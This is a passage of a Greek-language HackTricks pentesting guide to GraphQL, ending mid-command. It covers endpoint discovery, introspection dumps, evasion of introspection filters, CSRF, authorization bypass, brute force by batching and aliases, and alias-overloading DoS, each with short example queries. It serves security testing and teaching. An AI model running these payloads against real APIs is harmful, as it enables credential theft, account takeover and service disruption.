# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Εισαγωγή

Το GraphQL είναι **τονισμένο** ως μια **αποτελεσματική εναλλακτική** λύση στο REST API, προσφέροντας μια απλοποιημένη προσέγγιση για την ανάκτηση δεδομένων από το backend. Σε αντίθεση με το REST, το οποίο συχνά απαιτεί πολλές αιτήσεις σε διάφορα endpoints για τη συλλογή δεδομένων, το GraphQL επιτρέπει την ανάκτηση όλων των απαιτούμενων πληροφοριών μέσω μιας **μοναδικής αίτησης**. Αυτή η απλοποίηση **ωφελεί σημαντικά τους προγραμματιστές** μειώνοντας την πολυπλοκότητα των διαδικασιών ανάκτησης δεδομένων τους.

## GraphQL και Ασφάλεια

Με την εμφάνιση νέων τεχνολογιών, συμπεριλαμβανομένου του GraphQL, προκύπτουν επίσης νέες ευπάθειες ασφαλείας. Ένα βασικό σημείο που πρέπει να σημειωθεί είναι ότι **το GraphQL δεν περιλαμβάνει μηχανισμούς αυθεντικοποίησης από προεπιλογή**. Είναι ευθύνη των προγραμματιστών να εφαρμόσουν τέτοια μέτρα ασφαλείας. Χωρίς κατάλληλη αυθεντικοποίηση, τα endpoints του GraphQL μπορεί να εκθέσουν ευαίσθητες πληροφορίες σε μη αυθεντικοποιημένους χρήστες, θέτοντας σημαντικό κίνδυνο ασφαλείας.

### Επιθέσεις Brute Force Καταλόγου και GraphQL

Για να εντοπιστούν εκτεθειμένες περιπτώσεις GraphQL, συνιστάται η συμπερίληψη συγκεκριμένων διαδρομών σε επιθέσεις brute force καταλόγου. Αυτές οι διαδρομές είναι:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Ο εντοπισμός ανοιχτών περιπτώσεων GraphQL επιτρέπει την εξέταση των υποστηριζόμενων ερωτημάτων. Αυτό είναι κρίσιμο για την κατανόηση των δεδομένων που είναι προσβάσιμα μέσω του endpoint. Το σύστημα εσωτερικής αναγνώρισης του GraphQL διευκολύνει αυτό, παρέχοντας λεπτομέρειες για τα ερωτήματα που υποστηρίζει ένα σχήμα. Για περισσότερες πληροφορίες σχετικά με αυτό, ανατρέξτε στην τεκμηρίωση του GraphQL σχετικά με την εσωτερική αναγνώριση: [**GraphQL: Μια γλώσσα ερωτήσεων για APIs.**](https://graphql.org/learn/introspection/)

### Δακτυλοσκοπία

Το εργαλείο [**graphw00f**](https://github.com/dolevf/graphw00f) είναι ικανό να ανιχνεύσει ποια μηχανή GraphQL χρησιμοποιείται σε έναν διακομιστή και στη συνέχεια εκτυπώνει κάποιες χρήσιμες πληροφορίες για τον ελεγκτή ασφαλείας.

#### Καθολικά ερωτήματα <a href="#universal-queries" id="universal-queries"></a>

Για να ελέγξετε αν μια διεύθυνση URL είναι υπηρεσία GraphQL, μπορεί να σταλεί ένα **καθολικό ερώτημα**, `query{__typename}`. Εάν η απάντηση περιλαμβάνει `{"data": {"__typename": "Query"}}`, επιβεβαιώνει ότι η διεύθυνση URL φιλοξενεί ένα endpoint GraphQL. Αυτή η μέθοδος βασίζεται στο πεδίο `__typename` του GraphQL, το οποίο αποκαλύπτει τον τύπο του ερωτηθέντος αντικειμένου.
```javascript
query{__typename}
```
### Βασική Αρίθμηση

Το Graphql συνήθως υποστηρίζει **GET**, **POST** (x-www-form-urlencoded) και **POST**(json). Αν και για λόγους ασφαλείας συνιστάται να επιτρέπεται μόνο το json για να αποτραπούν οι επιθέσεις CSRF.

#### Εξερεύνηση

Για να χρησιμοποιήσετε την εξερεύνηση για να ανακαλύψετε πληροφορίες σχήματος, ερωτήστε το πεδίο `__schema`. Αυτό το πεδίο είναι διαθέσιμο στον ριζικό τύπο όλων των ερωτήσεων.
```bash
query={__schema{types{name,fields{name}}}}
```
Με αυτή την ερώτηση θα βρείτε το όνομα όλων των τύπων που χρησιμοποιούνται:

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Με αυτό το ερώτημα μπορείτε να εξαγάγετε όλους τους τύπους, τα πεδία του και τα επιχειρήματά του (και τον τύπο των επιχειρημάτων). Αυτό θα είναι πολύ χρήσιμο για να γνωρίζετε πώς να κάνετε ερωτήματα στη βάση δεδομένων.

![](<../../images/image (950).png>)

**Σφάλματα**

Είναι ενδιαφέρον να γνωρίζετε αν τα **σφάλματα** θα **εμφανιστούν** καθώς θα συμβάλλουν με χρήσιμες **πληροφορίες.**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Καταμέτρηση Σχήματος Βάσης Δεδομένων μέσω Εξερεύνησης**

> [!TIP]
> Εάν η εξερεύνηση είναι ενεργοποιημένη αλλά το παραπάνω ερώτημα δεν εκτελείται, δοκιμάστε να αφαιρέσετε τις οδηγίες `onOperation`, `onFragment` και `onField` από τη δομή του ερωτήματος.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Ερωτήση ενδοσκόπησης σε γραμμή:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Η τελευταία γραμμή κώδικα είναι ένα graphql query που θα εξάγει όλες τις μετα-πληροφορίες από το graphql (ονόματα αντικειμένων, παραμέτρους, τύπους...)

![](<../../images/image (363).png>)

Αν η introspection είναι ενεργοποιημένη, μπορείτε να χρησιμοποιήσετε [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) για να δείτε σε μια GUI όλες τις επιλογές.

### Ερωτήματα

Τώρα που γνωρίζουμε ποιο είδος πληροφοριών αποθηκεύεται στη βάση δεδομένων, ας προσπαθήσουμε να **εξάγουμε κάποιες τιμές**.

Στην introspection μπορείτε να βρείτε **ποιο αντικείμενο μπορείτε να ρωτήσετε απευθείας** (διότι δεν μπορείτε να ρωτήσετε ένα αντικείμενο απλώς επειδή υπάρχει). Στην παρακάτω εικόνα μπορείτε να δείτε ότι ο "_queryType_" ονομάζεται "_Query_" και ότι ένα από τα πεδία του αντικειμένου "_Query_" είναι το "_flags_", το οποίο είναι επίσης τύπος αντικειμένου. Επομένως, μπορείτε να ρωτήσετε το αντικείμενο flag.

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Σημειώστε ότι ο τύπος του query "_flags_" είναι "_Flags_", και αυτό το αντικείμενο ορίζεται ως εξής:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Μπορείτε να δείτε ότι τα αντικείμενα "_Flags_" αποτελούνται από **name** και **value**. Στη συνέχεια, μπορείτε να αποκτήσετε όλα τα ονόματα και τις τιμές των σημαιών με το query:
```javascript
query={flags{name, value}}
```
Σημειώστε ότι σε περίπτωση που το **αντικείμενο προς ερώτηση** είναι ενός **πρωτογενούς** **τύπου** όπως **string** όπως στο παρακάτω παράδειγμα

![](<../../images/image (958).png>)

Μπορείτε απλά να το ερωτήσετε με:
```javascript
query = { hiddenFlags }
```
Σε ένα άλλο παράδειγμα όπου υπήρχαν 2 αντικείμενα μέσα στο αντικείμενο τύπου "_Query_": "_user_" και "_users_".\
Αν αυτά τα αντικείμενα δεν χρειάζονται κανένα επιχείρημα για αναζήτηση, θα μπορούσες **να ανακτήσεις όλες τις πληροφορίες από αυτά** απλά **ζητώντας** τα δεδομένα που θέλεις. Σε αυτό το παράδειγμα από το Διαδίκτυο θα μπορούσες να εξάγεις τα αποθηκευμένα ονόματα χρηστών και κωδικούς πρόσβασης:

![](<../../images/image (880).png>)

Ωστόσο, σε αυτό το παράδειγμα αν προσπαθήσεις να το κάνεις αυτό θα λάβεις αυτό το **σφάλμα**:

![](<../../images/image (1042).png>)

Φαίνεται ότι με κάποιο τρόπο θα αναζητήσει χρησιμοποιώντας το επιχείρημα "_**uid**_" τύπου _**Int**_.\
Ούτως ή άλλως, το γνωρίζαμε ήδη, στην ενότητα [Basic Enumeration](graphql.md#basic-enumeration) προτάθηκε ένα ερώτημα που μας έδειχνε όλες τις απαραίτητες πληροφορίες: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Αν διαβάσεις την εικόνα που παρέχεται όταν εκτελώ αυτό το ερώτημα θα δεις ότι το "_**user**_" είχε το **arg** "_**uid**_" τύπου _Int_.

Έτσι, εκτελώντας κάποια ελαφριά _**uid**_ bruteforce βρήκα ότι στο _**uid**=**1**_ ανακτήθηκε ένα όνομα χρήστη και ένας κωδικός πρόσβασης:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Σημείωσε ότι **ανακάλυψα** ότι μπορούσα να ζητήσω για τις **παραμέτρους** "_**user**_" και "_**password**_" γιατί αν προσπαθήσω να αναζητήσω κάτι που δεν υπάρχει (`query={user(uid:1){noExists}}`) λαμβάνω αυτό το σφάλμα:

![](<../../images/image (707).png>)

Και κατά τη διάρκεια της **φάσης αρίθμησης** ανακάλυψα ότι το αντικείμενο "_**dbuser**_" είχε ως πεδία "_**user**_" και "_**password**_.

**Trick εξαγωγής συμβολοσειράς ερωτήματος (ευχαριστώ τον @BinaryShadow\_)**

Αν μπορείς να αναζητήσεις με βάση έναν τύπο συμβολοσειράς, όπως: `query={theusers(description: ""){username,password}}` και **αναζητήσεις για μια κενή συμβολοσειρά** θα **εξάγει όλα τα δεδομένα**. (_Σημείωσε ότι αυτό το παράδειγμα δεν σχετίζεται με το παράδειγμα των μαθημάτων, για αυτό το παράδειγμα υποθέτω ότι μπορείς να αναζητήσεις χρησιμοποιώντας "**theusers**" με βάση ένα πεδίο τύπου "**description**"_).

### Αναζήτηση

Σε αυτή τη ρύθμιση, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. **Άτομα** αναγνωρίζονται από το **email** και το **όνομά** τους; **ταινίες** από το **όνομά** τους και την **αξιολόγηση** τους. **Άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδεικνύοντας σχέσεις μέσα στη βάση δεδομένων.

Μπορείς να **αναζητήσεις** άτομα **με βάση** το **όνομα** και να πάρεις τα email τους:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Μπορείτε να **αναζητήσετε** άτομα **με** το **όνομα** και να αποκτήσετε τις **συνδρομημένες** **ταινίες** τους:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Σημειώστε πώς υποδεικνύεται να ανακτηθεί το `name` των `subscribedMovies` του ατόμου.

Μπορείτε επίσης να **αναζητήσετε αρκετά αντικείμενα ταυτόχρονα**. Σε αυτή την περίπτωση, γίνεται αναζήτηση 2 ταινιών:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ή ακόμα **σχέσεις διαφόρων διαφορετικών αντικειμένων χρησιμοποιώντας ψευδώνυμα**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Οι μεταλλάξεις χρησιμοποιούνται για να γίνουν αλλαγές στην πλευρά του διακομιστή.**

Στην **εξερεύνηση** μπορείτε να βρείτε τις **δηλωμένες** **μεταλλάξεις**. Στην παρακάτω εικόνα ο "_MutationType_" ονομάζεται "_Mutation_" και το αντικείμενο "_Mutation_" περιέχει τα ονόματα των μεταλλάξεων (όπως "_addPerson_" σε αυτή την περίπτωση):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

Σε αυτή τη ρύθμιση, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. **Άτομα** αναγνωρίζονται από το **email** και το **όνομά** τους; **ταινίες** από το **όνομά** τους και την **αξιολόγηση** τους. **Άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδεικνύοντας σχέσεις μέσα στη βάση δεδομένων.

Μια μετάλλαξη για **δημιουργία νέων** ταινιών μέσα στη βάση δεδομένων μπορεί να είναι όπως η παρακάτω (σε αυτό το παράδειγμα η μετάλλαξη ονομάζεται `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Σημειώστε πώς και οι δύο τιμές και ο τύπος δεδομένων υποδεικνύονται στο ερώτημα.**

Επιπλέον, η βάση δεδομένων υποστηρίζει μια **mutation** λειτουργία, ονόματι `addPerson`, η οποία επιτρέπει τη δημιουργία **προσώπων** μαζί με τις συσχετίσεις τους με υπάρχοντες **φίλους** και **ταινίες**. Είναι κρίσιμο να σημειωθεί ότι οι φίλοι και οι ταινίες πρέπει να υπάρχουν ήδη στη βάση δεδομένων πριν από τη σύνδεσή τους με το νεοδημιουργηθέν πρόσωπο.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Όπως εξηγείται σε [**μία από τις ευπάθειες που περιγράφονται σε αυτή την αναφορά**](https://www.landh.tech/blog/20240304-google-hack-50000/), η υπερφόρτωση εντολών σημαίνει την κλήση μιας εντολής ακόμη και εκατομμύρια φορές για να αναγκαστεί ο διακομιστής να σπαταλήσει λειτουργίες μέχρι να είναι δυνατόν να γίνει DoS.

### Batching brute-force σε 1 API αίτημα

Αυτή η πληροφορία προήλθε από [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Αυθεντικοποίηση μέσω GraphQL API με **ταυτόχρονη αποστολή πολλών ερωτημάτων με διαφορετικά διαπιστευτήρια** για να το ελέγξουμε. Είναι μια κλασική επίθεση brute force, αλλά τώρα είναι δυνατό να σταλούν περισσότερα από ένα ζεύγος login/password ανά HTTP αίτημα λόγω της δυνατότητας batching του GraphQL. Αυτή η προσέγγιση θα παραπλανήσει τις εξωτερικές εφαρμογές παρακολούθησης ρυθμού να πιστεύουν ότι όλα είναι καλά και δεν υπάρχει bot brute-forcing που προσπαθεί να μαντέψει κωδικούς.

Παρακάτω μπορείτε να βρείτε την απλούστερη επίδειξη ενός αιτήματος αυθεντικοποίησης εφαρμογής, με **3 διαφορετικά ζεύγη email/password ταυτόχρονα**. Προφανώς είναι δυνατό να σταλούν χιλιάδες σε ένα μόνο αίτημα με τον ίδιο τρόπο:

![](<../../images/image (1081).png>)

Όπως μπορούμε να δούμε από το στιγμιότυπο οθόνης της απάντησης, τα πρώτα και τρίτα αιτήματα επέστρεψαν _null_ και αντανάκλασαν τις αντίστοιχες πληροφορίες στην ενότητα _error_. Τα **δεύτερη μετάλλαξη είχε τα σωστά δεδομένα αυθεντικοποίησης** και η απάντηση έχει το σωστό διακριτικό συνεδρίας αυθεντικοποίησης.

![](<../../images/image (119) (1).png>)

## GraphQL Χωρίς Introspection

Όλο και περισσότερα **graphql endpoints απενεργοποιούν την introspection**. Ωστόσο, τα σφάλματα που ρίχνει το graphql όταν λαμβάνει μια απροσδόκητη αίτηση είναι αρκετά για εργαλεία όπως το [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) να αναδημιουργήσουν το μεγαλύτερο μέρος του σχήματος.

Επιπλέον, η επέκταση Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **παρακολουθεί τα αιτήματα GraphQL API που περνούν μέσω του Burp** και **δημιουργεί** ένα εσωτερικό **σχήμα** GraphQL με κάθε νέο ερώτημα που βλέπει. Μπορεί επίσης να εκθέσει το σχήμα για GraphiQL και Voyager. Η επέκταση επιστρέφει μια ψεύτικη απάντηση όταν λαμβάνει ένα ερώτημα introspection. Ως αποτέλεσμα, το GraphQuail δείχνει όλα τα ερωτήματα, τα επιχειρήματα και τα πεδία που είναι διαθέσιμα προς χρήση εντός του API. Για περισσότερες πληροφορίες [**ελέγξτε αυτό**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Μια ωραία **λίστα λέξεων** για να ανακαλύψετε [**οντότητες GraphQL μπορεί να βρεθεί εδώ**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Παράκαμψη αμυνών introspection του GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Για να παρακαμφθούν οι περιορισμοί στις ερωτήσεις introspection σε APIs, η εισαγωγή ενός **ειδικού χαρακτήρα μετά την λέξη-κλειδί `__schema`** αποδεικνύεται αποτελεσματική. Αυτή η μέθοδος εκμεταλλεύεται κοινές παραλείψεις προγραμματιστών σε μοτίβα regex που στοχεύουν να μπλοκάρουν την introspection εστιάζοντας στη λέξη-κλειδί `__schema`. Προσθέτοντας χαρακτήρες όπως **κενά, νέες γραμμές και κόμματα**, που το GraphQL αγνοεί αλλά μπορεί να μην έχουν ληφθεί υπόψη στο regex, οι περιορισμοί μπορούν να παρακαμφθούν. Για παράδειγμα, ένα ερώτημα introspection με μια νέα γραμμή μετά το `__schema` μπορεί να παρακάμψει τέτοιες αμυντικές γραμμές:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Αν δεν είναι επιτυχές, εξετάστε εναλλακτικές μεθόδους αιτήσεων, όπως **GET requests** ή **POST με `x-www-form-urlencoded`**, καθώς οι περιορισμοί μπορεί να ισχύουν μόνο για τις αιτήσεις POST.

### Δοκιμάστε WebSockets

Όπως αναφέρθηκε σε [**αυτή την ομιλία**](https://www.youtube.com/watch?v=tIo_t5uUK50), ελέγξτε αν είναι δυνατό να συνδεθείτε στο graphQL μέσω WebSockets, καθώς αυτό μπορεί να σας επιτρέψει να παρακάμψετε μια πιθανή WAF και να κάνετε την επικοινωνία websocket να διαρρεύσει το σχήμα του graphQL:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Ανακάλυψη Εκτεθειμένων Δομών GraphQL**

Όταν η introspection είναι απενεργοποιημένη, η εξέταση του πηγαίου κώδικα της ιστοσελίδας για προφορτωμένα ερωτήματα σε βιβλιοθήκες JavaScript είναι μια χρήσιμη στρατηγική. Αυτά τα ερωτήματα μπορούν να βρεθούν χρησιμοποιώντας την καρτέλα `Sources` στα εργαλεία προγραμματιστή, παρέχοντας πληροφορίες σχετικά με το σχήμα του API και αποκαλύπτοντας πιθανά **εκτεθειμένα ευαίσθητα ερωτήματα**. Οι εντολές για αναζήτηση στα εργαλεία προγραμματιστή είναι:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF στο GraphQL

Αν δεν ξέρετε τι είναι το CSRF, διαβάστε την παρακάτω σελίδα:

{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

Εκεί έξω θα μπορέσετε να βρείτε αρκετά GraphQL endpoints **ρυθμισμένα χωρίς CSRF tokens.**

Σημειώστε ότι τα αιτήματα GraphQL συνήθως αποστέλλονται μέσω POST requests χρησιμοποιώντας το Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ωστόσο, οι περισσότερες GraphQL τελικές σημεία υποστηρίζουν επίσης **`form-urlencoded` POST αιτήματα:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Ως εκ τούτου, καθώς τα αιτήματα CSRF όπως τα προηγούμενα αποστέλλονται **χωρίς προετοιμασία αιτημάτων**, είναι δυνατόν να **εκτελούνται** **αλλαγές** στο GraphQL εκμεταλλευόμενοι ένα CSRF.

Ωστόσο, σημειώστε ότι η νέα προεπιλεγμένη τιμή cookie της σημαίας `samesite` του Chrome είναι `Lax`. Αυτό σημαίνει ότι το cookie θα αποστέλλεται μόνο από έναν τρίτο ιστότοπο σε αιτήματα GET.

Σημειώστε ότι είναι συνήθως δυνατό να αποσταλεί το **query** **request** και ως **GET** **request** και το CSRF token μπορεί να μην επικυρώνεται σε ένα GET request.

Επίσης, εκμεταλλευόμενοι μια [**XS-Search**](../../pentesting-web/xs-search/index.html) **επίθεση** μπορεί να είναι δυνατό να εξάγουμε περιεχόμενο από το GraphQL endpoint εκμεταλλευόμενοι τα διαπιστευτήρια του χρήστη.

Για περισσότερες πληροφορίες **ελέγξτε το** [**αρχικό άρθρο εδώ**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Υπαγωγή WebSocket μεταξύ ιστότοπων στο GraphQL

Παρόμοια με τις ευπάθειες CRSF που εκμεταλλεύονται το graphQL, είναι επίσης δυνατό να εκτελέσετε μια **υπαγωγή WebSocket μεταξύ ιστότοπων για να εκμεταλλευτείτε μια αυθεντικοποίηση με το GraphQL με μη προστατευμένα cookies** και να κάνετε έναν χρήστη να εκτελεί απροσδόκητες ενέργειες στο GraphQL.

Για περισσότερες πληροφορίες ελέγξτε:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Εξουσιοδότηση στο GraphQL

Πολλές λειτουργίες GraphQL που ορίζονται στο endpoint μπορεί να ελέγχουν μόνο την αυθεντικοποίηση του αιτούντος αλλά όχι την εξουσιοδότηση.

Η τροποποίηση των μεταβλητών εισόδου του query θα μπορούσε να οδηγήσει σε ευαίσθητες λεπτομέρειες λογαριασμού [leaked](https://hackerone.com/reports/792927).

Η μετάλλαξη θα μπορούσε ακόμη και να οδηγήσει σε κατάληψη λογαριασμού προσπαθώντας να τροποποιήσει δεδομένα άλλου λογαριασμού.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Παράκαμψη εξουσιοδότησης στο GraphQL

[Η αλυσίδωση ερωτημάτων](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) μπορεί να παρακάμψει ένα αδύναμο σύστημα αυθεντικοποίησης.

Στο παρακάτω παράδειγμα μπορείτε να δείτε ότι η λειτουργία είναι "forgotPassword" και ότι θα έπρεπε να εκτελεί μόνο το ερώτημα forgotPassword που σχετίζεται με αυτό. Αυτό μπορεί να παρακαμφθεί προσθέτοντας ένα ερώτημα στο τέλος, σε αυτή την περίπτωση προσθέτουμε "register" και μια μεταβλητή χρήστη για το σύστημα να εγγραφεί ως νέος χρήστης.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Παράκαμψη Περιορισμών Ρυθμού Χρησιμοποιώντας Ψευδώνυμα στο GraphQL

Στο GraphQL, τα ψευδώνυμα είναι μια ισχυρή δυνατότητα που επιτρέπει την **ρητή ονομασία ιδιοτήτων** κατά την εκτέλεση ενός API request. Αυτή η δυνατότητα είναι ιδιαίτερα χρήσιμη για την ανάκτηση **πολλαπλών περιπτώσεων του ίδιου τύπου** αντικειμένου μέσα σε ένα μόνο αίτημα. Τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να ξεπεράσουν τον περιορισμό που εμποδίζει τα αντικείμενα GraphQL να έχουν πολλές ιδιότητες με το ίδιο όνομα.

Για μια λεπτομερή κατανόηση των ψευδώνυμων GraphQL, προτείνεται η παρακάτω πηγή: [Ψευδώνυμα](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Ενώ ο κύριος σκοπός των ψευδώνυμων είναι να μειώσουν την ανάγκη για πολλές κλήσεις API, έχει εντοπιστεί μια μη προγραμματισμένη περίπτωση χρήσης όπου τα ψευδώνυμα μπορούν να αξιοποιηθούν για την εκτέλεση επιθέσεων brute force σε ένα GraphQL endpoint. Αυτό είναι δυνατό επειδή ορισμένα endpoints προστατεύονται από περιοριστές ρυθμού που έχουν σχεδιαστεί για να αποτρέπουν επιθέσεις brute force περιορίζοντας τον **αριθμό των HTTP requests**. Ωστόσο, αυτοί οι περιοριστές ρυθμού ενδέχεται να μην λαμβάνουν υπόψη τον αριθμό των λειτουργιών μέσα σε κάθε αίτημα. Δεδομένου ότι τα ψευδώνυμα επιτρέπουν την προσθήκη πολλαπλών ερωτημάτων σε ένα μόνο HTTP request, μπορούν να παρακάμψουν τέτοιες ρυθμίσεις περιορισμού.

Σκεφτείτε το παράδειγμα που παρέχεται παρακάτω, το οποίο απεικονίζει πώς μπορούν να χρησιμοποιηθούν τα ερωτήματα με ψευδώνυμα για να επαληθευτούν οι κωδικοί έκπτωσης καταστήματος. Αυτή η μέθοδος θα μπορούσε να παρακάμψει τον περιορισμό ρυθμού, καθώς συγκεντρώνει αρκετά ερωτήματα σε ένα HTTP request, επιτρέποντας ενδεχομένως την επαλήθευση πολλών κωδικών έκπτωσης ταυτόχρονα.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS in GraphQL

### Alias Overloading

**Alias Overloading** είναι μια ευπάθεια του GraphQL όπου οι επιτιθέμενοι υπερφορτώνουν ένα ερώτημα με πολλές ψευδώνυμες για το ίδιο πεδίο, αναγκάζοντας τον πίσω διαχειριστή να εκτελεί αυτό το πεδίο επανειλημμένα. Αυτό μπορεί να υπερφορτώσει τους πόρους του διακομιστή, οδηγώντας σε **Denial of Service (DoS)**. Για παράδειγμα, στο παρακάτω ερώτημα, το ίδιο πεδίο (`expensiveField`) ζητείται 1,000 φορές χρησιμοποιώντας ψευδώνυμα, αναγκάζοντας τον πίσω διαχειριστή να το υπολογίσει 1,000 φορές, πιθανώς εξαντλώντας την CPU ή τη μνήμη:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
